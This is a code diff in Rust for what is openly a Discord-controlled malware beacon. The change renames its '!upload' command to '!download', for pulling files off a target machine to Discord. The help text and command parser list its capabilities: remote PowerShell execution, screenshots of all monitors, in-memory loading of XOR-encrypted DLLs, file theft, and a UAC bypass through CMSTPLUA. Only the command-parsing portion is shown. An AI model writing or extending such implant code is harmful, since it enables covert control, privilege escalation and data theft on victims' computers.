@@ -7,7 +7,7 @@ const HELP_TEXT: &str = "**Available commands:**\n\
     - `!shell <command>` - Execute a PowerShell command\n\
     - `!scr` - Take a screenshot of all monitors\n\
     - `!loaddll [name]` - Load attached DLL (XOR encrypted) into memory\n\
-    - `!upload <path>` - Upload a file from the target to Discord\n\
+    - `!download <path>` - Download a file from the target to Discord\n\
     - `!uacbypass [cmd]` - UAC bypass via CMSTPLUA (method 41)\n\
     - `!kill` - Terminate the beacon (unload DLL)\n\
     - `!help` - Show this help message";
@@ -43,9 +43,9 @@ pub enum Command {
     /// Format: "!uacbypass [command]"
     UacBypass(String),
 
-    /// Upload a file from the target filesystem to Discord
-    /// Format: "!upload <path>"
-    Upload(String),
+    /// Download a file from the target filesystem to Discord
+    /// Format: "!download <path>"
+    Download(String),
 
     /// Terminate the beacon by unloading the DLL
     /// Format: "!kill"
@@ -118,11 +118,11 @@ impl Command {
             return Command::UacBypass(cmd);
         }
 
-        // Check for "!upload " prefix
-        if let Some(rest) = content_lower.strip_prefix("!upload ") {
+        // Check for "!download " prefix
+        if let Some(rest) = content_lower.strip_prefix("!download ") {
             if !rest.trim().is_empty() {
-                let path = content["!upload ".len()..].trim().to_string();
-                return Command::Upload(path);
+                let path = content["!download ".len()..].trim().to_string();
+                return Command::Download(path);
             }
         }
 
